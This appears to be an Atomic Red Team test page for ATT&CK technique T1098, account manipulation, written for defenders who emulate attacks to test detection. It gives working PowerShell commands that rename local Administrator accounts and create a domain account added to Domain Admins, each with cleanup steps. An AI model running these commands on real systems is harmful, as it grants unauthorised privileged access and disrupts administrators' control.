# T1098 - Account Manipulation
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1098)
<blockquote>Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.</blockquote>

## Atomic Test #1 - Admin Account Manipulate
Manipulate Admin Account Name

**Supported Platforms:** Windows





#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHa_$x$y$z

$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        $account = $member.Name -replace ".+\\\","" # strip computername\
        $originalDescription = (Get-LocalUser -Name $account).Description
        Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
        Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation
        Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
        }
    }
```

#### Cleanup Commands:
```powershell
$list = Get-LocalUser |?{$_.Description -like "atr:*"}
foreach($u in $list) {
  $u.Description -match "atr:(?<Name>[^;]+);(?<Description>.*)"
  Set-LocalUser -Name $u.Name -Description $Matches.Description
  Rename-LocalUser -Name $u.Name -NewName $Matches.Name
  Write-Host "Successfully Reverted Account $($u.Name) to $($Matches.Name) on " $Env:COMPUTERNAME
}
```

## Atomic Test #2 - Domain Account and Group Manipulate
Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). 

The quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,
you need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to 
create the user and alter the group. Automatic installation of the dependency requires an elevated session, 
and is unlikely to work with Powershell Core (untested).

If you consider running this test against a production Active Directory, the good practise is to create a dedicated
service account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated
as group manager of the target group.

Example: `Invoke-AtomicTest -Session $session 'T1098' -TestNames "Domain Account and Group Manipulate" -InputArgs @{"group" = "DNSAdmins" }`

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| account_prefix | Prefix string of the random username (by default, atr-). Because the cleanup deletes such account based on
a match `(&(samaccountname=#{account_prefix}-*)(givenName=Test))`, if you are to change it, be careful. | String | atr-|
| group | Name of the group to alter | String | Domain Admins|
| create_args | Additional string appended to New-ADUser call | String | |


#### Attack Commands: Run with `powershell`! 


```powershell
$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = "#{account_prefix}-$x$y$z"
New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember "#{group}" $account
```

#### Cleanup Commands:
```powershell
Get-ADUser -LDAPFilter "(&(samaccountname=#{account_prefix}-*)(givenName=Test))" | Remove-ADUser -Confirm:$False
```



#### Dependencies:  Run with `powershell`!
##### Description: PS Module ActiveDirectory
##### Check Prereq Commands:
```powershell
Try {
    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
    exit 0
} 
Catch {
    exit 1
} 
```
##### Get Prereq Commands:
```powershell
if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}
```
